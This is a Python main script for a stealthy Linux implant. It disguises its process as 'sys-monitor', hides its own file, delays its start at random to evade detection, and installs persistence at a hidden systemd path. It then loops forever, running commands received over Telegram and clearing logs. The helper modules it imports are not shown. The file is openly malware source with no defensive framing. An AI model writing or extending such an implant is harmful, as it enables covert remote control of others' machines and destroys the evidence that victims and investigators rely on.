from utils.camouflage import set_process_name, hide_file
from utils.persistence import setup_persistence, random_start_delay
from utils.execution import handle_telegram_commands, execute_command
from utils.anti_forensics import clear_logs, self_destruct

def main():
    # Camouflage the script as a new process name
    set_process_name("sys-monitor")
    hide_file(__file__)

    # Random delay to avoid patterns
    random_start_delay()

    # Set up persistence
    setup_persistence("/usr/lib/systemd/.sys-monitor-helper.py")

    # Main loop to handle commands and operations
    while True:
        handle_telegram_commands()
        clear_logs()

if __name__ == "__main__":
    main()
